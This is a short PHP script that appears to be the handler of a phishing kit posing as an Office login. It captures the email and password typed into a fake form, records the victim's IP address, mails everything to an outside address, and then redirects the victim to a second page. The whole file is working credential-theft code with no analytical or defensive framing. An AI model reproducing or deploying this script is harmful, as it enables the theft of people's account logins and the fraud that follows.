<?php
if($_POST["mail"] != "" and $_POST["pass"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "\n";
$message .= "Email: ".$_POST['mail']."\n";
$message .= "pass: ".$_POST['pass']."\n";
$message .= "\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "\n";
$message .= "\n";
$message .= "\n";
$send = "HasleyJon@protonmail.com";
$subject = " Oflfic//e | $ip";
{
mail("$send", "$subject", $message);   
}
  header ("Location: index2.html");
}

?>